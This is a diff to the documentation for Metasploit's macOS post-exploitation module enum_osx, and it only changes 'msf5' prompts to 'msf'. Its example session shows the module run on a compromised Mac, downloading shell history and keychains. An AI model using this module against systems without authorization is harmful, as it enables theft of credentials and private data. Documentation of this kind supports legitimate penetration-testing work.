@@ -42,8 +42,8 @@ The following information is enumerated:
 ### User level shell on OSX 10.14.4
 
 ```
-msf5 > use post/osx/gather/enum_osx 
-msf5 post(osx/gather/enum_osx) > show options
+msf > use post/osx/gather/enum_osx 
+msf post(osx/gather/enum_osx) > show options
 
 Module options (post/osx/gather/enum_osx):
 
@@ -51,9 +51,9 @@ Module options (post/osx/gather/enum_osx):
    ----     ---------------  --------  -----------
    SESSION                   yes       The session to run this module on.
 
-msf5 post(osx/gather/enum_osx) > set session 1
+msf post(osx/gather/enum_osx) > set session 1
 session => 1
-msf5 post(osx/gather/enum_osx) > run
+msf post(osx/gather/enum_osx) > run
 
 [*] Running module against MacBook-Pro.nogroup
 [*] Saving all data to /logs/post/enum_osx/MacBook-Pro.nogroup_20190415.5738
@@ -85,7 +85,7 @@ msf5 post(osx/gather/enum_osx) > run
 [*] 	Downloading .bash_history
 [*] Enumerating and Downloading keychains for h00die
 [*] Post module execution completed
-msf5 post(osx/gather/enum_osx) > ls -lah /logs/post/enum_osx/MacBook-Pro.nogroup_20190415.5738
+msf post(osx/gather/enum_osx) > ls -lah /logs/post/enum_osx/MacBook-Pro.nogroup_20190415.5738
 [*] exec: ls -lah /logs/post/enum_osx/MacBook-Pro.nogroup_20190415.5738
 
 total 1.4M
